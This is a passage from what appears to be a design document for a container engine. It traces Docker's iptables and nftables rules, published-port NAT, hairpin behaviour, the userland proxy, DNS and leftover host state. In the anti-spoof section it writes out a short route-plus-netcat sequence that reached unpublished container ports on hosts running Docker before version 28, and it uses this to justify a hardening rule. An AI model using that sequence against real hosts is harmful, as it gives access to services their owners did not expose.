It is not a firewall drop; the kernel simply refuses to be a router. The resulting symptom is
distinctive: container-to-container on the same bridge **still works** (that is L2 switching, no
routing involved) while egress, published ports and container-to-host-other-interface all die. That
combination is routinely misdiagnosed as DNS.
Source: `Documentation/networking/ip-sysctl.rst`.

**Fact.** `br_netfilter` with `net.bridge.bridge-nf-call-iptables = 1` pushes frames **switched**
between two bridge ports through the `iptables` `PREROUTING`/`FORWARD`/`POSTROUTING` hooks as if
they were routed. There are two independent controls: the global sysctl and a per-bridge
`IFLA_BR_NF_CALL_IPTABLES` flag.
**Convention.** Docker leaves the per-bridge flag at `0` on its own bridges while the global sysctl
is `1`. Measured: global `= 1`, per-bridge `nf_call_iptables 0`.

**Convention — and a leak worth naming.** On a packaged Docker install the global `= 1` is
**Docker's own doing**, not the admin's. Measured on the same host:
`/etc/modules-load.d/snap.docker.conf` lists `br_netfilter`, so the module is loaded at every boot —
`lsmod` shows it with **refcount 0**, the drop-in is named for a package (`snap.docker`) that is not
the one running (`/usr/bin/dockerd`), and loading the module changed packet processing for *every*
bridge on the host, libvirt's and the admin's included. Docker then opts its own bridges back out.
**This outlives not just the process but the uninstall.**

**Recommendation.** Do not load or enable `br_netfilter`, and if we ever ship a package it must
install **no** `modules-load.d` or `sysctl.d` drop-in. Everything we need we do at runtime, in a
namespace, where it dies with us.

**Recommendation.** The one legitimate use of `br_netfilter` — blocking container↔container traffic
on one bridge, which is L2-switched and therefore invisible to any L3 rule — has a strictly better
answer: `IFLA_BRPORT_ISOLATED = 1` (attribute 33) on every container's veth port. The kernel bridge
itself then refuses to forward between isolated ports: no netfilter, no conntrack pressure, no
global sysctl, no module. Measured: the flag is present and reported (`isolated off`) on kernel
6.11. Tradeoff: `isolated` is all-or-nothing per port, with no "let these two talk"; anyone needing
real policy should use separate networks.

---

### 11.4 The published-port path, end to end

This is the central trace. The ruleset below was collected read-only from a live production host —
Ubuntu 24.10, kernel 6.11.0-29-generic, Docker 28.3.1, `iptables v1.8.10 (nf_tables)` — twice, seven
weeks apart, and reproduced rule-for-rule including order.

#### The chains, and the jump order

```
# nat
-A PREROUTING  -m addrtype --dst-type LOCAL -j DOCKER
-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER
-A POSTROUTING -s 172.18.0.0/16 ! -o br-9d68a0cc943b -j MASQUERADE
-A DOCKER -i br-9d68a0cc943b -j RETURN
-A DOCKER ! -i br-9d68a0cc943b -p tcp --dport 80 -j DNAT --to-destination 172.18.0.4:80

# filter
-P FORWARD DROP
-A FORWARD -j DOCKER-USER            <-- 1st, empty, never written by Docker
-A FORWARD -j DOCKER-FORWARD         <-- 2nd
-A FORWARD -j ufw-before-logging-forward … (the host firewall's chains)   <-- 3rd
-A DOCKER-FORWARD -j DOCKER-CT
-A DOCKER-FORWARD -j DOCKER-ISOLATION-STAGE-1
-A DOCKER-FORWARD -j DOCKER-BRIDGE
-A DOCKER-FORWARD -i br-9d68a0cc943b -j ACCEPT
-A DOCKER-CT      -o br-9d68a0cc943b -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A DOCKER-BRIDGE  -o br-9d68a0cc943b -j DOCKER
-A DOCKER -d 172.18.0.4/32 ! -i br-9d68a0cc943b -o br-9d68a0cc943b -p tcp --dport 80 -j ACCEPT
-A DOCKER ! -i br-9d68a0cc943b -o br-9d68a0cc943b -j DROP
-A DOCKER-ISOLATION-STAGE-1 -i br-9d68a0cc943b ! -o br-9d68a0cc943b -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-2 -o br-9d68a0cc943b -j DROP

# raw — one rule per container IP
-A PREROUTING -d 172.18.0.4/32 ! -i br-9d68a0cc943b -j DROP
```

#### Inbound, hop by hop

A SYN arrives on the uplink for `<host-public-ip>:80`.

1. **`raw/PREROUTING`** (netfilter priority `raw` = −300, the first IPv4 hook). Checked against the
   per-container-IP DROP rules. The destination is the host's public address, not a container
   address, so no match. (If a machine on the LAN had added a route to the container subnet and sent
   a packet directly to `172.18.0.4:3306`, *this* is where it dies — §11.4's hardening, below.)
2. **conntrack** (priority −200). New flow, tuple created, not yet confirmed.
3. **`nat/PREROUTING`** (priority `dstnat` = −100). `-m addrtype --dst-type LOCAL` means "the
   destination is an address configured on this host" — it matches the public address, and equally
   `127.0.0.1` and the bridge's own `172.18.0.1`. In nft it compiles to `fib daddr type local`.
   Jump to `DOCKER`. The `-i <bridge> -j RETURN` rule does not match (we came in on the uplink). The
   DNAT rule matches.
   **Note what the DNAT rule does not say: there is no `-d`.** It matches port 80 on *any* interface
   that is not the bridge, so `-p 80:80` genuinely publishes on every host address, including
   private VPC addresses and second NICs. That is a broader exposure than most people picture.
4. **Routing.** Destination is now `172.18.0.4`, non-local, so it must be **forwarded** — which
   requires `net.ipv4.ip_forward = 1`. Output interface: the bridge.
5. **`filter/FORWARD`.** Policy is DROP, so an explicit accept is required.
   `DOCKER-USER` (empty) → `DOCKER-FORWARD` → `DOCKER-CT` (our packet is `NEW`, no match) →
   `DOCKER-ISOLATION-STAGE-1` (matches traffic *leaving* a bridge; we are entering one, no match) →
   `DOCKER-BRIDGE` → `filter/DOCKER` → the per-port ACCEPT matches. Had it not matched, the
   `! -i <bridge> -o <bridge> -j DROP` catch-all is the "unpublished ports are not reachable"
   guarantee at L3.
6. **`nat/POSTROUTING`.** The source is still the *client's* address, not a container address, so
   the MASQUERADE rules do not match. **Inbound published-port traffic is not masqueraded; the
   container sees the real client IP.**
7. **Bridge → veth → container.** A veth transmit is a direct `netif_rx` into the peer in the same
   softirq context: no queueing discipline, no payload copy, just an skb handed across.

**Fact.** A DNAT in `PREROUTING` applies **only to the first packet of a flow**; every subsequent
packet is translated by conntrack directly and never re-traverses the `nat` table. That is why NAT
rules are cheap and why the DNAT counters count roughly *connections*, not packets.

**Fact.** The reverse path needs no SNAT rule, and this is the piece people look for in
`iptables-save` and cannot find: conntrack recognises the reply direction and **reverses the
recorded DNAT itself**. Because the source has already been un-DNAT'd before `POSTROUTING`, the
MASQUERADE rule correctly does not match and nothing is double-translated.
**Recommendation.** Since this symmetry is entirely conntrack's doing, surface `nf_conntrack_count`
/ `nf_conntrack_max` in diagnostics. Measured: 212–294 of 262144 on a busy production host, i.e. a
non-issue — which is the point. It is two file reads, and the failure mode when it is *not* fine is
bizarre and partial.

**Fact — the counters are a clean proof of the chain structure.** Over 32 days on that host,
`nat/DOCKER` DNAT and `filter/DOCKER` ACCEPT counters are **identical per port** (33,695 on :80;
1,738,000 on :443). The DNAT rule is *translation* and the filter rule is *authorization* for the
same first-packet-of-flow; `DOCKER-CT` absorbs everything after.

#### The host-originated path, which is a different path

**Fact.** Locally generated packets never traverse `PREROUTING`. They go
`OUTPUT (raw) → conntrack → OUTPUT (nat) → routing → POSTROUTING`. Without a `nat/OUTPUT` rule a
published port would be reachable from every other machine on earth and **not from the host
itself** — one of the more confusing failure modes a container engine can ship.

**Fact — and the exclusion is the load-bearing part.** The rule is
`-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER`. Therefore:

- `curl <host-routable-ip>:80` from the host → `dst-type LOCAL`, not in 127/8 → **DNAT applies,
  reaches the container.** (Measured: 36 packets on that rule.)
- `curl 127.0.0.1:80` from the host → **excluded, no DNAT at all.** It is delivered locally to
  whatever is bound to `0.0.0.0:80`. On a default Docker host that is the userland proxy, and
  nothing else.

The exclusion exists because DNAT-ing a `127.0.0.1` destination to a routable address is exactly the
martian case that `net.ipv4.conf.*.route_localnet` exists to permit, and enabling `route_localnet`
is a real security downgrade: Docker's own release notes record that before 28.0.0, *"hosts within
the same L2 segment … can reach ports published to localhost"* because of it. Measured:
`route_localnet = 0` on all twelve interfaces of the production host, re-verified.
Source: `docs.docker.com/engine/network/port-publishing/`.

**Recommendation.** **Three nat rules per published port, not two**: `PREROUTING → our chain` for
external traffic, `OUTPUT → our chain` with `! -d 127.0.0.0/8` for host-originated traffic via a
routable local address, and the DNAT itself. **The loopback case is deliberately excluded from DNAT
and must be covered by a helper process that `bind()`s the loopback address.** Do not reach for
`route_localnet`: it re-introduces the pre-28 L2 leak and it is a persistent host mutation, whereas
a `bind()` is free.

#### The same-host hairpin case, and the mechanism that is actually responsible

**Fact — corrected, by experiment.** For the case "a container connects to its own published port
via the host's address", bridge **hairpin mode is neither necessary nor sufficient**. The thing that
is both is a **SNAT/MASQUERADE on the bridge-to-itself path**.

Five configurations, a complete bridge+NAT+publish topology built inside `unshare -Urn`
(bridge `10.77.0.1/24`, container at `10.77.0.2/24` with a default route, `ip_forward=1`, listener
on `0.0.0.0:80`, nft dstnat `8080 → 10.77.0.2:80`, srcnat masquerade).
Measured: Rocky 8.8, kernel 4.18.0-425.3.1.el8, rootless.

| # | Configuration | Result |
|---|---|---|
| sanity | container → its own `10.77.0.2:80` directly | `OK peer=10.77.0.2` |
| **A** | DNAT on all input interfaces, **hairpin OFF** | **timeout** |
| **B** | DNAT on all input interfaces, **hairpin ON** | **timeout — still fails** |
| **C** | B **+ bridge-to-itself MASQUERADE** (`saddr 10.77/24 daddr 10.77/24 oif br0 masquerade`) | **`OK peer=10.77.0.1`** |
| **D** | Docker-shaped: DNAT only for `iifname != br0`, hairpin ON, masq present | **`Connection refused`**, 0 listeners on `:8080` |
| **E** | DNAT on all interfaces + the MASQUERADE, **hairpin OFF again** | **`OK peer=10.77.0.1`** |

**E falsifies "hairpin is necessary"; B falsifies "hairpin is sufficient."**

**Fact — the mechanism.** The packet is **routed, not switched**. `10.77.0.1` is a *local* address,
so the frame is delivered up to the IP stack, DNAT'd in `nat/PREROUTING`, and then re-emitted by the
bridge device *from the local stack* via `br_dev_xmit`. The 802.1D "never send a frame out the port
it arrived on" check — `should_deliver()`'s `skb->dev != p->dev` — compares against the skb's
**ingress** device, which for a locally-generated skb is the bridge itself, not the veth port. The
check never fires, so hairpin has nothing to disable. What actually breaks it is ordinary hairpin
NAT: without SNAT the container sees a SYN from `10.77.0.2` to `10.77.0.2`, replies *inside its own
namespace*, the reply never traverses the root namespace's conntrack, the DNAT is never reversed,
and the client's socket waits forever — the observed **timeout**, not a refusal. With the MASQUERADE
the container sees `peer=10.77.0.1` and the reply is forced back through conntrack.

**WEAK-EVIDENCE — one sub-case untested.** The matrix ran with `br_netfilter` inactive
(`/proc/sys/net/bridge` is `ENOENT` in an unprivileged namespace). With `br_netfilter` active *and*
the per-bridge `nf_call_iptables` flag set, bridged frames enter the nat hooks while still in the
bridge forwarding path, and a DNAT there would produce a genuinely switched frame for which hairpin
*is* required. That is not our configuration (§11.3 recommends against it, and Docker disables it
per-bridge) but it is unverified. **The test:** a disposable **root** VM —
`modprobe br_netfilter; sysctl net.bridge.bridge-nf-call-iptables=1;
ip link set br0 type bridge nf_call_iptables 1` — then re-run the five rows.

**Fact.** On a Docker-shaped ruleset the case never reaches the L2 question at all. The rule
`-A DOCKER -i <bridge> -j RETURN` does **two** jobs: it stops container-origin traffic being DNAT'd
by *another* container's publish rule, **and** it makes the hairpin case structurally unreachable by
DNAT. A container's packet arrives `-i <bridge>`, hits the RETURN, is never translated, and is
delivered locally to whatever holds `0.0.0.0:<port>`. Row **D** above is this exact configuration
and produces `Connection refused` — the precise signature a stock Docker host would show if the
userland proxy were not holding that port.

**Recommendation.** Skip hairpin — but skip it because it is **the wrong knob**, not because the
case is rare. When we do want the case to work it is **one MASQUERADE rule in the nft transaction we
already build**, not an `IFLA_BRPORT_MODE` attribute. That is strictly cheaper than the usual
estimate and it drops into the per-attachment rule set we already emit.

#### `docker-proxy`: what it is for, and what breaks without one

**Convention.** Docker still spawns a userland proxy per published port by default in 28.3.1 —
measured: no `/etc/docker/daemon.json` on the host, `dockerd`'s cmdline carries no
`--userland-proxy` flag, and four `docker-proxy` processes are running (one IPv4 and one IPv6 per
published port). Each is invoked with `-use-listen-fd`: **the daemon creates and binds the socket
itself and passes the fd**, so the bind — and therefore the "port is taken" error — happens in the
daemon, synchronously with `run`, which is where you want it.

**Fact.** What it does is a trivial userspace relay: `accept()` on the host listener, `connect()` to
`<container-ip>:<container-port>`, copy bytes both ways (for UDP, `recvfrom`/`sendto` with a
per-source-tuple map). Two consequences: the container sees the connection as coming from the bridge
address, not the real client; and every byte is copied through userspace twice.

Its four roles, and what each failure looks like if we never write one:

| Role | Why DNAT cannot do it | Consequence of omitting the helper |
|---|---|---|
| **v6 host → v4-only container** | a NAT rule cannot change address family | **IPv6 clients cannot reach the container at all.** On the measured production host this is the *entire* IPv6 service: `ip6tables -t nat -S` shows the `DOCKER` chain **empty**, `net.ipv6.conf.all.forwarding = 0`, `EnableIPv6: false` — yet `[::]:80` and `[::]:443` are listening, and the proxies have accumulated 4 s of CPU over 32 days doing real work |
| **`-p 127.0.0.1:…`** | `nat/OUTPUT` excludes 127/8 by design | **loopback publishing silently does not work.** The only alternatives are a helper `bind()` or `route_localnet=1`, and the latter is a security downgrade and a persistent host mutation |
| **container → its own published port** | the `-i <bridge> RETURN` rule precedes DNAT | `Connection refused` for that case. Rare; deferrable |
| **holding the port** | DNAT is invisible to the socket layer | `ss -ltnp` shows **nothing** for published ports, and an unrelated process's conflicting `bind()` **succeeds** — the port is DNAT'd away before the local listener sees it, so the admin gets a listener that never receives a packet. The quietest of the four and the one most worth a warning |

**Recommendation.** Ship a userland proxy equivalent, but only for the cases that need it, and never
as the data path for ordinary IPv4. Concretely: IPv4 on a non-loopback host address ⇒ DNAT only, no
helper, zero overhead; IPv4/IPv6 loopback ⇒ helper that binds the loopback address; IPv6 host
address → IPv4-only container ⇒ helper. **Bind the socket in our own process and pass the fd** to
the helper: the `EADDRINUSE` then surfaces synchronously at `run` time, and if the helper crashes
and restarts the port is never briefly free. The helper is ~100 lines of accept/connect/copy and no
crate exists that is worth the dependency.
**Recommendation (later).** Dual-stack the containers. If containers get IPv6 addresses the
v6→v4 case disappears and DNAT covers everything, which deletes the proxy's main justification. That
is IPv6 IPAM plus `net.ipv6.conf.all.forwarding`, so it is not MVP, but it is the *right* fix.

#### Anti-spoof hardening

**Convention.** Docker 28.0 added one `raw/PREROUTING` rule per container IP —
`-d <container-ip> ! -i <its bridge> -j DROP` — closing a long-standing hole. The pre-28 exposure
required only that `ip_forward` was on, that `filter/FORWARD` was ACCEPT, and that another machine
on the LAN added a route: `ip route add 172.17.0.2/32 via <host>` then `nc 172.17.0.2 3306` reached
an **unpublished** container port.
Source: `docker.com/blog/docker-engine-28-hardening-container-networking-by-default/`.

**Fact.** `raw` and not `filter` because `raw/PREROUTING` runs at priority −300, **before conntrack
and before nat**. Dropping there means the packet never creates a conntrack entry and never gets
DNAT'd, so it cannot be laundered into looking legitimate.

**Recommendation.** Implement it. It is a handful of rules and it is the difference between
"containers are isolated" being true and being aspirational. One calibration from live counters:
over 32 days all seven such rules on the production host fired **zero** packets. That is zero-cost
insurance against a rare but catastrophic precondition — so it is **not** a hot path and should not
be optimised as one. (It is still an argument for named sets, but on *update* cost — one set element
per container start/stop versus one rule insert/delete into a shared chain — and on atomicity, not
on evaluation cost.)

**Convention.** Docker 28 also generalised this into a per-network `gateway_mode`: `nat` (default),
`nat-unprotected` (DNAT without filtering — the pre-28 behaviour), `routed` (no NAT, still only
published ports reachable) and `isolated`. `routed` is the honest answer for people who *do* control
their router; not MVP.

---

### 11.5 iptables versus nftables, and the decision it forces

#### What `iptables v1.8.10 (nf_tables)` means

**Fact.** Since iptables 1.8.0 there are two binaries behind an alternatives symlink.
`iptables-legacy` talks to the **`x_tables`** kernel subsystem via `setsockopt`/`libiptc`;
`iptables-nft` talks to the **`nf_tables`** subsystem via `libnftnl`/netlink, parsing iptables syntax
and translating it into nft expressions. The `(nf_tables)` in the version banner means the second.
On any modern distribution, **`iptables` is no longer an implementation, it is a syntax.**

**Fact.** The translation layer creates nft tables named after the iptables tables (`ip filter`,
`ip nat`, `ip raw`, `ip6 filter`, …) with base chains at the classic iptables hook priorities, and
tags them with a udata marker so `nft` prints
`# Warning: table ip nat is managed by iptables-nft, do not touch!`. The same rules render both
ways: `-m addrtype --dst-type LOCAL` → `fib daddr type local`; `-i`/`-o` → `iifname`/`oifname`;
`-j MASQUERADE` → `masquerade`. Note that the translation adds `counter` to **every** rule, because
iptables semantics guarantee per-rule counters while native nft counters are opt-in — a real cost of
the compatibility layer.

**Fact.** Three consequences that matter.
(1) `iptables-save` and `nft list ruleset` are two renderings of one kernel state; there is no
synchronisation problem *between the views*.
(2) **`iptables-nft` cannot see native nft rules.** Measured: on the production host
`iptables -t filter -S` shows Docker's and the host firewall's chains and **never mentions**
`table inet f2b-table`, although fail2ban's rule is live and currently rejecting an address. An
admin auditing with `iptables-save` would conclude fail2ban was not running.
(3) `iptables-legacy` and `iptables-nft` rules can coexist in the kernel and **both be evaluated**,
because `x_tables` and `nf_tables` register independent hooks.

#### Verdict semantics, stated precisely, because this is where the decision hides

**Fact.** From the nftables manual, *Overall evaluation of the ruleset*, verbatim:

> *"An **accept** verdict (including an implicit one via the base chain's policy) **ends the
> evaluation of the current base chain**. The packet advances to the next base chain. … Thus a
> packet is ultimately accepted **if and only if no (matching) rule or base chain policy issues a
> drop verdict**."*
>
> *"A **drop** verdict (including an implicit one via the base chain's policy) **immediately ends
> the evaluation of the whole ruleset**. No further chains of any hook are consulted."*
>
> *"The ordering is ascending: for each hook, chains with lower priority values are evaluated before
> those with higher ones"*, **"regardless of the table to which they belong"**, and **"the ordering
> of chains with identical priority is undefined."**

Source: `netfilter.org/projects/nftables/manpage.html`.

Three things follow, and the third is the one that forces a decision.

**Fact.** Priority decides order across tables at one hook, ascending, lower number first, ties
undefined. Named aliases: `raw = -300`, `mangle = -150`, `dstnat = -100`, `filter = 0`,
`security = 50`, `srcnat = 100`. `iptables-nft` is pinned to exactly these, so it **cannot compete
on priority**; its only lever is rule position inside its own chain. A native-nft program can pick
any priority it likes. Measured in production: fail2ban writes native nft at
`type filter hook input priority filter - 1` = **−1**, one below where `iptables-nft` pins `INPUT`,
so its rules run before every iptables rule on the host and nothing iptables could write gets ahead
of it.

**Fact.** `nat`-type chains must have priority **above −200**. Our anti-spoof chain belongs at −300
(§11.4), which is below that bound, so it must be declared `type filter hook prerouting priority
-300`, **not** `type nat`. Verified accepted on kernel 4.18.

**Fact — and this is the decisive one.** `accept` in our table buys us **nothing against a later
drop**. `iptables -t filter -P FORWARD DROP` is rendered by `iptables-nft` as a base-chain **policy
drop** on `ip filter`'s FORWARD chain at priority 0, and a base-chain policy drop is terminal for
the whole ruleset. Therefore:

> **If we write our rules in `table inet mydocker` and `accept` forwarded container traffic there,
> and the host has a foreign `filter/FORWARD` policy of DROP with no matching accept of its own, our
> traffic is dropped anyway — at every priority. Priority buys ordering, not authority. There is no
> priority low enough to out-accept a later dropper, because `accept` does not end the ruleset.**

This is not hypothetical. It is the state of the measured production host (`-P FORWARD DROP`, set by
both `ufw` and Docker) and it is the state of every Ubuntu host that has ever run `ufw enable` or
installed Docker.

**Trap.** The tempting mis-statement is "a terminal verdict in a lower-priority chain can end
evaluation before the higher-priority table is consulted". That is true of `drop` and **false of
`accept`**, and bundling them hides exactly the risk above. It also gets the granularity wrong:
`accept` ends the current **base chain**, not "this table at this hook" — a table may hold several
base chains at one hook and `accept` in one does not skip its siblings.

#### DISPUTED: what to do on a host whose `FORWARD` policy is foreign-DROP

The facts are settled; the response is not, and it must be decided before we ship a routed network.
The absolute position "write native nftables and never touch iptables at all" is **not operationally
achievable** on the hosts we will actually run on: a purely native-nftables engine gives containers
**no network at all on a stock `ufw`-enabled Ubuntu box, with no error anywhere.** Silent total
failure is the worst possible shipping outcome.

| Option | What it costs | What it buys | Against it |
|---|---|---|---|
| **1. Detect and refuse** — read `nft list ruleset`, find a base chain at hook `forward` whose policy is `drop` and that is not ours, and refuse to create a routed network or publish a port without an explicit override flag | ~20 lines, one ruleset read at network-create | the problem surfaces at the right moment, with the right message, and we never write outside our own table | the user still cannot run containers until they act; we have turned a silent failure into a loud one and nothing more |
| **2. Write exactly one marked `accept` into the foreign `ip filter` FORWARD chain** | we touch iptables, once, and own it | containers work on the hosts people actually have | that one rule is **the only piece of our state that can become a permanent orphan** (§11.7), so it must carry an unmistakable greppable marker (`-m comment --comment "mydocker:<netid>"`) and an explicit line in the reconcile sweep |
| **3. Set `filter/FORWARD` policy to ACCEPT ourselves** and rely on our own drop | one global host mutation | same as 2 | strictly worse than 2: it is a silent, global security change of exactly the kind §11.7 says never to make, and it has no inverse |

**The decision to make: option 1, option 2, or option 1 defaulting to option 2 behind a flag.**
Option 3 is excluded. Whichever is chosen must be **explicit, logged and user-visible** — the one
thing that must not ship is the absolute form, because its failure mode is containers with no
network and no diagnostic.

#### The upstream picture has moved, and it moved in our direction

**Convention.** **Docker Engine 29.0.0 shipped an nftables firewall backend on 2025-11-10**,
enabled by setting the daemon's `firewall-backend` option to `nftables`. It is documented as
experimental, cannot be enabled in Swarm mode, and overlay-network rules have not been migrated;
iptables remains the default. Current release at time of writing: 29.9.2 (2026-10-20).
Sources: `docs.docker.com/engine/release-notes/29/`,
`docs.docker.com/engine/network/firewall-nftables/`.

**Trap — a methodological one worth naming once.** A `docker info` reading of
`{"Driver":"iptables"}` on a single host is evidence about *that host*, not about upstream. The host
measured here is pinned at 28.3.1, a major version behind. Check the release feed; a production host
you did not upgrade is not a source about what a project ships.

**Convention.** **netavark v2.0.0 (10 June 2026) "Removed iptables support"** as a listed breaking
change; v2.1.0 (06 August 2026) made the bridge driver default to strict isolation. Podman's network
backend is now nftables-only.
Source: `github.com/containers/netavark/releases/tag/v2.0.0`.

Three details of Docker's nftables mode bear directly on our design:

**Convention.** *"For bridge networks, Docker creates two tables, `ip docker-bridges`"* and
`ip6 docker-bridges`, with base chains plus per-network chains at *"well known priority values"*.
**Recommendation.** Diverge: use a **single `inet` table**. The v4/v6 asymmetry is a real bug — the
measured host has an empty `ip6 nat DOCKER` chain and carries its entire IPv6 service on the
userland proxy — and `inet` removes the whole class of "we forgot the v6 rule". Know that we are
diverging from the reference implementation, and that `inet` chains cannot use family-specific
statements without an explicit `ip`/`ip6` qualifier.

**Convention.** *"In Docker's nftables implementation, **there is no `DOCKER-USER` chain**."*
Instead the documentation tells the admin to *"create your own table with base chains of type
`filter` and hook `forward`, and set priorities relative to Docker's chains."*
**Recommendation.** There is therefore nothing for us to mirror: do **not** create a
`MYDOCKER-USER`-style empty chain. The admin's override mechanism *is* a table at a lower priority —
**which makes our chain priorities a public API.** Document them, freeze them, and treat a change to
them as a breaking change, because the moment an admin writes a chain at "our priority minus one",
those numbers are an interface.

**Convention.** *"nftables: Docker will **not** enable IP forwarding on the host."* A deliberate
divergence from its own iptables backend, which does.
**Recommendation.** Match the nftables behaviour, not the iptables one: **detect `ip_forward = 0`,
fail the network create with a one-line explanation and the exact `sysctl` command, and never write
it ourselves.** This converts §11.1's "writing `ip_forward` resets all per-interface config" from a
hazard we must navigate into one we never trigger, and it removes the largest irreversible global
mutation from our risk list. The cost is that the admin must act once.

#### Where this leaves the recommendation

**Recommendation.** Write every rule of ours **natively, in one `table inet mydocker`, and never
express our policy in iptables syntax.** The reasons, re-weighted against current evidence:

| Reason | Weight |
|---|---|
| **Atomicity** — a whole transaction applies or none of it does | **strongest.** It lands directly on the hardest problem in this domain: partial state after a crash. With rule-at-a-time iptables, publishing a port is several operations and dying at N−1 leaves a host that is *insecure* — a filter ACCEPT with no `raw` anti-spoof rule is precisely the pre-28 hole, opened by a crash. Verified working rootless on kernel 4.18: `nft -f <file>` applies a whole-table replacement as one transaction |
| **Named sets and maps** | **confirmed mechanically, re-weighted.** Sets, elements and set-matching rules all work rootless on 4.18. But the anti-spoof rules fire zero packets in a month, so the gain is **update** cost and legibility, not evaluation cost |
| **Priority control** | **narrowed.** It lets us run *before* other writers and place our anti-spoof `drop` at −300. It does **not** let us accept past them. Defensive placement, not offensive |
| **One namespace of our own** | **confirmed, and §11.7 shows it is worth more than it looks.** `nft list table inet mydocker` is a complete inventory and `nft delete table inet mydocker` is a complete atomic reset |
| **`inet` family covers v4 and v6 in one table** | **confirmed**, and the gap it closes is live on the measured host |
| **Direction of travel** | **upgraded to a firm convention.** netavark has removed iptables entirely; Docker has shipped an nftables backend. Nobody is moving the other way |

**Trap.** `flush table` is **not** `delete table`. Verified on kernel 4.18: after
`nft flush table inet mydocker`, the named set **and its elements survived**
(`elements = { 10.77.0.2, 10.77.0.3 }`); only the rules were cleared. A reconcile pass built on
`flush` would silently carry stale container addresses forward in the anti-spoof set — precisely the
failure the reconcile exists to prevent. Always `delete table`.

---

### 11.6 DNS

**Fact.** The load-bearing fact, and the reason a container engine cannot just copy the host's file:
**`127.0.0.53` is meaningless inside a container network namespace.** Each namespace has its own
loopback. A container sending to `127.0.0.53:53` reaches *its own* loopback, where nothing is
listening. Since systemd-resolved is the default on Ubuntu, Fedora and Arch, naively copying
`/etc/resolv.conf` yields a container with no DNS on the majority of modern Linux hosts.
Measured: host `/etc/resolv.conf` → `/run/systemd/resolve/stub-resolv.conf`,
`nameserver 127.0.0.53`, with `systemd-resolve` listening on `127.0.0.53%lo:53`.

**Fact.** `/etc/resolv.conf` and `/etc/hosts` are **generated per container on the host and
bind-mounted over the image's copies** — they are not part of the image. That is why editing them
inside a container does not survive a restart, and it makes them a mount concern as much as a
networking one.

**Convention — the embedded-resolver mechanism, mapped end to end.** Measured live:

```
container /etc/resolv.conf     nameserver 127.0.0.11
                               # Based on host file: '/etc/resolv.conf' (internal resolver)
                               # ExtServers: [host(127.0.0.53)]

container-namespace nat        -A DOCKER_OUTPUT      -d 127.0.0.11/32 -p udp --dport 53 \
                                  -j DNAT --to-destination 127.0.0.11:43967
                               -A DOCKER_POSTROUTING -s 127.0.0.11/32 -p udp --sport 43967 \
                                  -j SNAT --to-source :53

listeners in that namespace    UNCONN 127.0.0.11:43967  users:(("dockerd",pid=70234,fd=57))
                               LISTEN 127.0.0.11:42041  users:(("dockerd",pid=70234,fd=60))
```

Assembled: the daemon creates UDP and TCP sockets **while temporarily `setns`'d into the container
namespace** (§11.1), binding each to `127.0.0.11` on a random high port; the container's resolver
sends to `127.0.0.11:53`; namespace-local `nat/OUTPUT` DNATs that to the high port; the reply's
source would be `127.0.0.11:<highport>`, which glibc and musl both **reject** because they verify
the reply comes from the address:port queried, so `nat/POSTROUTING` SNATs it back to `:53`. The
`host(...)` wrapper in `ExtServers` means "forward upstream queries to `127.0.0.53`, resolved from
the host network namespace" — which the daemon can do and the container cannot.

**Fact.** The ports are random **per container and re-rolled on restart** — measured as drift across
seven weeks on the same service: `39251`/`55634` became `42041`/`43967`, and the owning fds moved
`52/54 → 57/60`. **The four rules must therefore be written per namespace, after the socket is
bound, on every start.**

**WEAK-EVIDENCE.** The stated rationale for a random high port rather than `:53` — avoiding a
collision with a container that binds `0.0.0.0:53`, which *includes* `127.0.0.11:53` — is the only
explanation consistent with the design, but no maintainer statement was found. **The test:** the
commit message for libnetwork's resolver in moby.

**Fact.** `127.0.0.11` works for three reasons, all necessary: it is in `127.0.0.0/8` so it is
unambiguously loopback and cannot collide with a container subnet; the whole `/8` is already routed
to `lo` by the kernel, so no route needs adding; and it is not `127.0.0.1`, so it does not collide
with services the container binds on localhost. The specific value `.11` is arbitrary convention,
and there is no IPv6 equivalent — the IPv4 address works even in IPv6-only containers.

**Convention.** Name resolution between containers exists on user-defined networks and **not** on
the default bridge, because the resolver answers from per-network records and the default bridge has
none. `--link`, the legacy mechanism, injected `/etc/hosts` entries and environment variables into
the dependent container at start time; it was static, unidirectional, could not express a cycle, and
is deprecated. **Recommendation:** do not implement `--link`. The `/etc/hosts` injection underneath
it is fine; making it a user-facing dependency declaration was the mistake.

**Recommendation — what an MVP can honestly skip.**

- **Stage 1, ~30 lines, and genuinely shippable.** Read the host's `/etc/resolv.conf`, keep every
  non-loopback `nameserver`, **discard loopback addresses** (`127.0.0.0/8`, `::1`), and if nothing
  survives, fall back to a *configured* default and log loudly. Do **not** silently hardcode a
  public resolver — that is a privacy decision we should not make for the user; make it a flag with
  no default and emit a clear error when unset. Keep `search`/`options` as-is. Also generate
  `/etc/hosts`: the six boilerplate lines plus **`<container-ip> <hostname>`**, which matters more
  than it looks because a great deal of software calls `gethostname()` and then resolves it. This
  works on systemd-resolved hosts precisely because it *drops* `127.0.0.53` rather than
  understanding it.
- **Stage 2, ~20 lines.** `/etc/hosts` injection for peer names: append `<ip> <name>` for every
  existing peer to the new container's file and the new container's line to every peer's. No
  resolver, no listener, no NAT rules. **Known ceiling:** it is a snapshot, so a container that
  restarts with a new address leaves stale entries everywhere — the same flaw that killed `--link`.
  Sticky addressing (§11.9) largely removes it, and measured evidence says the bet is sound:
  across a restart, container addresses were unchanged while container ids and namespace mounts
  changed.
- **Stage 3, the embedded resolver — skip entirely in an MVP.** It needs a DNS message codec, the
  `setns` socket dance, and per-namespace NAT rules. It buys dynamic name resolution and nothing
  else.

**Recommendation.** When stage 3 is built, **bind `127.0.0.11:53` directly and skip the DNAT/SNAT
rules.** The rules exist *only* because the port is random, and the port is random *only* because of
the `0.0.0.0:53` conflict. Binding `:53` removes four rules per namespace, the ordering dependency
between socket-bind and rule-write, and an entire class of restart bug — in exchange for a loud
`EADDRINUSE` in the rare case where a container runs its own DNS server on `0.0.0.0:53`. Converting
silent weirdness into a clear error is the right trade.

---

### 11.7 Host state that outlives our process

This is the subsection that changes the shape of the design rather than adding a feature. Everything
else describes what to build; this describes what happens when we do not finish building it.

#### The inventory

**Fact.** Complete accounting of the host state one container start touches, and who frees it:

| Object | Freed when our process dies? | Freed by | Cost of leaking it |
|---|---|---|---|
| container-side veth (`eth0`) | **yes** | kernel, when the namespace is freed | none |
| host-side veth | **yes** | kernel — deleting either end deletes both | none |
